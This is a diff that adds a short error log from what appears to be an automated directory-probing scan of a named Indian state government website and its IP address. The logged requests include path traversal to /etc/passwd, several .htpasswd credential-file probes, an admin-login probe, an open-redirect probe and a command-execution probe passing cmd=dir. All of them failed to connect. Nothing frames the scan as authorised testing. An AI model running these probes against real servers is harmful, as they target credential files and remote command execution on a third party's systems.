@@ -1,0 +1,7 @@
+
+[21-04-12 18:46:31] - http://adijambava.karnataka.gov.in/ - %2e%2e//google.com - Cannot connect to: adijambava.karnataka.gov.in:80
+[21-04-12 18:47:11] - http://adijambava.karnataka.gov.in/ - !.htpasswd - There was a problem in the request to: http://164.100.133.201:80/!.htpasswd
+[21-04-12 18:49:42] - http://adijambava.karnataka.gov.in/ - \..\..\..\..\..\..\..\..\..\etc\passwd - Cannot connect to: adijambava.karnataka.gov.in:80
+[21-04-12 18:50:23] - http://adijambava.karnataka.gov.in/ - _.htpasswd - There was a problem in the request to: http://164.100.133.201:80/_.htpasswd
+[21-04-12 18:52:15] - http://adijambava.karnataka.gov.in/ - adminlogin/ - Cannot connect to: adijambava.karnataka.gov.in:80
+[21-04-12 18:57:52] - http://adijambava.karnataka.gov.in/ - p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir - There was a problem in the request to: http://164.100.133.201:80/p_/webdav/xmltools/minidom/xml/sax/saxutils/os/popen2?cmd=dir
